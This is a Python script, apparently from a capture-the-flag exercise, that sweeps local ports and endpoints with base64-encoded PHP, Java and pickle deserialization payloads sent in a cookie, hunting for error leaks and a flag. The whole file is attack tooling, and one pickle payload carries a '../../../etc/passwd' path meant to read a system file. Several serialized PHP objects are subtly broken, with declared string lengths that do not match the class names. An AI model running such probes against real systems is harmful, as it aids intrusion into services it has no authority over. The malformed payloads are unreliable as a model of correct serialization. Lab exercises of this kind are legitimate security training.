# advanced_deserialization_test.py
import base64
import requests
import urllib.parse
import json

# List of common ports and endpoints to test
COMMON_PORTS = [80, 8080, 8000, 3000, 5000, 9000]
COMMON_ENDPOINTS = [
    "/", "/index", "/index.php", "/home", "/dashboard", 
    "/api", "/api/v1", "/admin", "/login", "/profile"
]

# PHP Deserialization Gadget Payloads (mimic phpggc style)
def generate_php_gadgets():
    """Generate PHP deserialization gadget payloads that could trigger RCE"""
    payloads = []
    
    # Common PHP gadget chains - these are simplified versions
    # that try to exploit common magic methods
    
    # Payload 1: Simple error trigger to reveal class names
    # O:8:"Exception":1:{s:5:"message";s:3:"test";}
    payload1 = base64.b64encode(b'O:8:"Exception":1:{s:5:"message";s:3:"test";}').decode()
    payloads.append(("Exception_trigger", payload1))
    
    # Payload 2: Try to trigger file system operations
    # O:9:"RecursiveIteratorIterator":0:{}
    payload2 = base64.b64encode(b'O:9:"RecursiveIteratorIterator":0:{}').decode()
    payloads.append(("Iterator", payload2))
    
    # Payload 3: JSON array (baseline)
    payload3 = "W10K"  # [] - the original
    payloads.append(("Baseline_JSON", payload3))
    
    # Payload 4: Malformed PHP object to trigger errors
    # O:6:"Object":1:{s:4:"test";s:4:"test";}
    payload4 = base64.b64encode(b'O:6:"Object":1:{s:4:"test";s:4:"test";}').decode()
    payloads.append(("Malformed_Object", payload4))
    
    # Payload 5: Array with data
    # a:1:{i:0;s:4:"test";}
    payload5 = base64.b64encode(b'a:1:{i:0;s:4:"test";}').decode()
    payloads.append(("Simple_Array", payload5))
    
    # Payload 6: Try to trigger __toString
    payload6 = base64.b64encode(b'O:8:"stdClass":1:{s:4:"data";O:8:"stdClass":0:{}}').decode()
    payloads.append(("Nested_Object", payload6))
    
    return payloads

# Java Deserialization Payloads
def generate_java_gadgets():
    """Generate Java deserialization gadget payloads"""
    payloads = []
    
    # Common Java serialization headers
    ysoserial_headers = [
        "rO0ABXNy",  # Base64 of Java serialized object header
        "rO0ABXNyABV4ZWFkZXJleGFtcGxlLg==",
    ]
    
    for i, header in enumerate(ysoserial_headers):
        payloads.append((f"Java_Header_{i+1}", header))
    
    return payloads

# Python Pickle Payloads
def generate_pickle_gadgets():
    """Generate Python pickle deserialization payloads"""
    payloads = []
    
    # Python pickle opcodes for various objects
    pickle_payloads = [
        "gASVLg==",  # Empty dict
        "gASVBwAAAAAAAAB9Lg==",  # Another empty structure
        "gASVEgAAAAAAAABDLi4vLi4vLi4vZXRjL3Bhc3N3ZA==",  # File path attempts
    ]
    
    for i, payload in enumerate(pickle_payloads):
        payloads.append((f"Pickle_Payload_{i+1}", payload))
    
    return payloads

# Test all combinations
def test_all_endpoints():
    """Test all port/endpoint combinations to find the target"""
    php_payloads = generate_php_gadgets()
    java_payloads = generate_java_gadgets()
    pickle_payloads = generate_pickle_gadgets()
    
    all_results = []
    
    print("=== TESTING DESERIALIZATION VULNERABILITIES ===\n")
    
    for port in COMMON_PORTS:
        base_url = f"http://127.0.0.1:{port}"
        print(f"\n[*] Testing port {port}...")
        
        for endpoint in COMMON_ENDPOINTS:
            full_url = base_url + endpoint
            print(f"  [*] Testing endpoint: {endpoint}")
            
            # Try each type of payload
            for payload_type, payloads in [("PHP", php_payloads), ("Java", java_payloads), ("Pickle", pickle_payloads)]:
                for payload_name, payload_value in payloads:
                    cookies = {
                        'bookmarks': payload_value,
                        'user': '5fb5fa20dbac4c5cacd23ae94e1b2709'
                    }
                    
                    try:
                        response = requests.get(full_url, cookies=cookies, timeout=5)
                        
                        # Look for interesting responses
                        is_interesting = False
                        interesting_reasons = []
                        
                        if response.status_code == 500:
                            is_interesting = True
                            interesting_reasons.append("500 error")
                        
                        # Check response content for errors
                        content_lower = response.text.lower()
                        if 'unserialize' in content_lower or 'deserialize' in content_lower:
                            is_interesting = True
                            interesting_reasons.append("Deserialization error")
                        
                        if 'exception' in content_lower or 'error' in content_lower:
                            is_interesting = True
                            interesting_reasons.append("Exception thrown")
                        
                        if 'wakeup' in content_lower or 'destruct' in content_lower:
                            is_interesting = True
                            interesting_reasons.append("Magic method called")
                        
                        # Check for flag
                        import re
                        flag_match = re.search(r'FLAG{[^}]+}', response.text)
                        if flag_match:
                            print(f"    [!!!!!!!!] FLAG FOUND: {flag_match.group()}")
                            all_results.append({
                                'url': full_url,
                                'port': port,
                                'endpoint': endpoint,
                                'payload_type': payload_type,
                                'payload_name': payload_name,
                                'payload': payload_value,
                                'status': response.status_code,
                                'flag': flag_match.group(),
                                'success': True
                            })
                            return all_results  # Found flag, stop testing
                        
                        if is_interesting and response.status_code != 404:
                            print(f"    [!] Interesting response ({payload_type} - {payload_name}):")
                            print(f"        Status: {response.status_code}")
                            print(f"        Size: {len(response.text)}B")
                            print(f"        Reasons: {', '.join(interesting_reasons)}")
                            
                            if len(response.text) < 500:
                                print(f"        Content: {response.text[:200]}")
                            
                            all_results.append({
                                'url': full_url,
                                'port': port,
                                'endpoint': endpoint,
                                'payload_type': payload_type,
                                'payload_name': payload_name,
                                'payload': payload_value,
                                'status': response.status_code,
                                'size': len(response.text),
                                'interesting': True
                            })
                    except requests.exceptions.ConnectionError:
                        print(f"    [*] Connection refused - port {port} not listening")
                        break  # Skip to next port
                    except requests.exceptions.Timeout:
                        print(f"    [*] Timeout on {endpoint}")
                        continue
                    except Exception as e:
                        continue
    
    return all_results

# Create advanced payload if simple ones don't work
def create_advanced_php_payload():
    """Create more sophisticated PHP object injection payload"""
    
    # Try to create a payload that might trigger include() or eval()
    # This is a common pattern in PHP deserialization exploits
    
    # O:9:"Exception":1:{s:5:"message";s:20:"test";}
    # But encoded in different ways
    
    payloads = []
    
    # Base payload (standard base64)
    standard = base64.b64encode(b'O:9:"Exception":1:{s:5:"message";s:4:"test";}').decode()
    payloads.append(("Standard", standard))
    
    # URL encoded version
    url_encoded = urllib.parse.quote(standard)
    payloads.append(("URL_Encoded", url_encoded))
    
    # Double URL encoded
    double_url = urllib.parse.quote(url_encoded)
    payloads.append(("Double_URL", double_url))
    
    # Try different class names that might exist
    common_classes = [
        'Exception',
        'Error',
        'stdClass',
        'DateTime',
        'PDO',
        'mysqli',
        'ReflectionClass'
    ]
    
    for cls in common_classes:
        payload = base64.b64encode(f'O:{len(cls)}:"{cls}":0:{{}}'.encode()).decode()
        payloads.append((f"Class_{cls}", payload))
    
    return payloads

# Test with different HTTP methods
def test_http_methods(url):
    """Test different HTTP methods with deserialization payload"""
    
    methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE']
    cookies = {
        'bookmarks': 'Tzo2OiJPYmplY3QiOjA6e30=',  # O:6:"Object":0:{}
        'user': '5fb5fa20dbac4c5cacd23ae94e1b2709'
    }
    
    print(f"\n[*] Testing HTTP methods on {url}...")
    
    for method in methods:
        try:
            response = requests.request(method, url, cookies=cookies, timeout=5)
            print(f"  [*] {method}: {response.status_code} ({len(response.text)}B)")
        except Exception as e:
            print(f"  [*] {method}: Error - {e}")

